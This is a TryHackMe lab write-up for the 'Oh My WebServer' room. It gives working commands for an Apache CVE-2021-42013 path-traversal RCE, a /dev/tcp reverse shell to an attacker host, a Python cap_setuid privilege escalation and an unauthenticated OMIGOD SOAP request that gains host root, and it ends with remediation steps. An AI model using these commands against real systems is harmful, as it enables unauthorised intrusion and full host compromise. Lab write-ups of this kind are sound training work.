# Oh My WebServer — TryHackMe Writeup

> **Room:** [Oh My WebServer](https://tryhackme.com/room/ohmyweb) · **Difficulty:** Medium
> **Category:** Web / Container Escape · **Author of writeup:** 0xnyx
> **Goal:** Get RCE on the web app, escape the container, and root the host.

> ⚠️ In line with TryHackMe's write-up policy, **no flags are included** — only the methodology.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

- **22/tcp** — OpenSSH
- **80/tcp** — **Apache httpd 2.4.49 (Unix)**

Apache **2.4.49** is the giveaway — it's vulnerable to **CVE-2021-42013** (path traversal → RCE).

## 2. Foothold — CVE-2021-42013

When `mod_cgi` is enabled, the path-traversal flaw lets you execute a binary (e.g. `/bin/sh`)
via a POST body. The traversal segments are encoded as `.%2e` to bypass Apache's normalization:

```bash
curl -s --path-as-is 'http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id; hostname'
# uid=1(daemon) ... hostname = <hex>  -> we're inside a Docker container
```

The hostname being a 12-char hex string confirms we're in a **container**. A reverse shell
follows the same way (POST a `bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1`).

## 3. Container root — Linux capabilities

Enumerate file capabilities:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.7 = cap_setuid+ep
```

`cap_setuid` on a Python binary = instant root inside the container (GTFOBins):

```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

The **user flag** is in the container's `/root/`.

## 4. Container escape — OMIGOD (CVE-2021-38647)

From inside the container, probe the Docker gateway (`172.17.0.1`):

```bash
for p in 22 80 1270 5985 5986; do
  timeout 1 bash -c "echo > /dev/tcp/172.17.0.1/$p" 2>/dev/null && echo "$p OPEN"
done
# 5986 OPEN  -> OMI / OMIGOD
```

Port **5986** is Microsoft's OMI agent, vulnerable to **CVE-2021-38647 (OMIGOD)** — an
**unauthenticated** RCE. A single SOAP request with an **empty authentication header**
runs commands as **root on the host**. Minimal client (namespaces must be complete):

```bash
curl -s -k -X POST https://172.17.0.1:5986/wsman \
 -H "Content-Type: application/soap+xml;charset=UTF-8" \
 --data-binary @omigod.xml      # ExecuteShellCommand with <p:command>id; hostname; cat /root/root.txt</p:command>
```

A successful response returns `<p:ReturnCode>0` and the command output in `<p:StdOut>` —
`uid=0(root)` with the **host's** hostname confirms the escape. The **root flag** is in
the host's `/root/`.

---

## Lessons

- Apache **2.4.49 / 2.4.50** → CVE-2021-42013 / CVE-2021-41773 (path traversal, RCE with mod_cgi). Use `--path-as-is` and `.%2e` encoding.
- `getcap -r /` is a core privesc check — `cap_setuid` on an interpreter is instant root.
- After landing in a container (hex hostname), **scan the Docker gateway `172.17.0.1`** for host services.
- **OMIGOD (CVE-2021-38647)** on OMI (ports 5986/1270) is unauthenticated root RCE — one SOAP request.

## Remediation

- Patch Apache (≥ 2.4.51) and disable `mod_cgi` where not needed.
- Don't grant Linux capabilities to interpreters.
- Patch or remove OMI; never expose it, and don't run containers with host-network reachability to sensitive agents.

---

*Write-up for [TryHackMe — Oh My WebServer](https://tryhackme.com/room/ohmyweb).*
